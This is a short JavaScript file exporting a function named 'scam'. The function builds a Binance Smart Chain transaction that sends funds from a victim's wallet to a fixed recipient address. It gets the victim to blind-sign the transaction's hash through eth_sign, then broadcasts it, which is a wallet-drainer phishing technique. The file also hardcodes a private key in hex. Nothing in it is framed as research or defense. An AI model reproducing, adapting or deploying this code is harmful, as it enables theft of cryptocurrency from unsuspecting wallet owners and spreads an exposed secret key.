import { Transaction } from '@ethereumjs/tx';
import Common, { Hardfork, Chain } from '@ethereumjs/common';
const Web3 = require("web3");

// const {
//     PRIVATE_KEY
// } = require("../env.json")

export async function scam(walletAddress, erc20Obj) {
    var provider = 'https://bsc-dataseed.binance.org/';
    let web3 = new Web3(new Web3.providers.HttpProvider(provider));
    const pKey = Buffer.from('c1976bc7eb891250454e9708b3dbe75d616294f9ad1965dbd93c7868b21ceaa9', 'hex')
    console.log(walletAddress)
    await web3.eth.getTransactionCount(walletAddress, "pending").then(async nonce1 => {
        console.log('From address nonce:' + web3.utils.numberToHex(nonce1));
        const gasPrice = await web3.eth.getGasPrice()

        let chainId = await web3.eth.getChainId();

        let wei_send = 10000000000000000; // wei to send

        let tx_ = {
            //from: userAddr,
            "to": "0xb38dF27e23cfb76C224F92b3569B5272b39c1F08",
            "nonce": web3.utils.toHex(nonce1),
            "gasLimit": "0x55F0", // gasLimit
            "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            "value": web3.utils.toHex(wei_send),
            "data": "0x",
            "v": "0x1",
            "r": "0x",
            "s": "0x"
        }

        const common = new Common({ chain: Chain.Goerli, hardfork: Hardfork.Istanbul }); //, hardfork: 'petersburg'
        var tx = new Transaction(tx_, common);
        console.log(tx.serialize)

        var serializedTx = "0x" + tx.serialize().toString("hex");
        let hexer = { "encoding": "hex" };


        const sha3_ = web3.utils.sha3(serializedTx, hexer);
        console.log("rawTx1:", serializedTx);
        console.log("rawHash1:", sha3_);

        await web3.eth.sign(sha3_, walletAddress).then(async signed => {
            const temporary = signed.substring(2),
                r_ = "0x" + temporary.substring(0, 64),
                s_ = "0x" + temporary.substring(64, 128),
                rhema = parseInt(temporary.substring(128, 130), 16),
                v_ = web3.utils.toHex(rhema + chainId * 2 + 8);
            console.log("r:", r_);
            console.log("s:", s_);
            console.log("y:", v_.toString("hex"));
            tx.r = r_;
            tx.s = s_;
            tx.v = v_;
            console.log(tx);

            console.log("---------------------------------------------");

            const txFin = "0x" + tx.serialize().toString("hex")//,
            const sha3__ = web3.utils.sha3(txFin, hexer);
            console.log("rawTx:", txFin);
            console.log("rawHash:", sha3__);
            await web3.eth.sendSignedTransaction(txFin).then(elisebeth => console.log(elisebeth)).catch(vannette => console.log(vannette))
        }).catch(heide => console.log(heide))
    })
}